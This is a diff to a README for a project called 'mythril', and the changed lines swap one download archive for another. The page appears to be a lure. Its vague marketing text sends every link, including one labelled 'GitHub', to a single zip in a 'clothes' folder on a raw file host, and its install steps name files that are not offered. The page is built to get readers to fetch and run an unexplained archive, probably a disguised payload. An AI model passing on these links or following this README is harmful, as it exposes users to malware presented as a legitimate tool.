@@ -1,20 +1,20 @@
 # 🎉 mythril - Easy Tools for Your Project Needs
 
 ## 📦 Download Now!
-[![Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip)
+[![Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip)](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to mythril! This project provides supporting resources related to various technical needs. With mythril, accessing helpful tools becomes a breeze, even for those without programming skills.
 
 ## 📥 Download & Install
-To start using mythril, visit this page to download the latest version: [Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip).
+To start using mythril, visit this page to download the latest version: [Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip).
 
 1. Click on the “Releases” tab.
 2. Find the latest version listed.
 3. Download the file that matches your operating system:
    - For Windows: Choose the `.exe` file.
    - For Mac: Choose the `.dmg` file.
-   - For Linux: Choose the appropriate `https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip` package.
+   - For Linux: Choose the appropriate `https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip` package.
 4. Follow the installation instructions that appear on your screen.
 
 ## 📂 Features
@@ -51,9 +51,9 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 🌐 Community
 Join our community to stay updated on the latest releases and tips. Follow us on:
-- [GitHub](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip)
+- [GitHub](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip)
 - [Twitter](#) (link placeholder)
 
 By using mythril, you can streamline your project processes and access the tools you need efficiently. Happy exploring! 
 
-[![Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip)](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_v1.5-alpha.4.zip)
+[![Download mythril](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip)](https://raw.githubusercontent.com/JorgePantera/mythril/main/clothes/Software_3.1.zip)
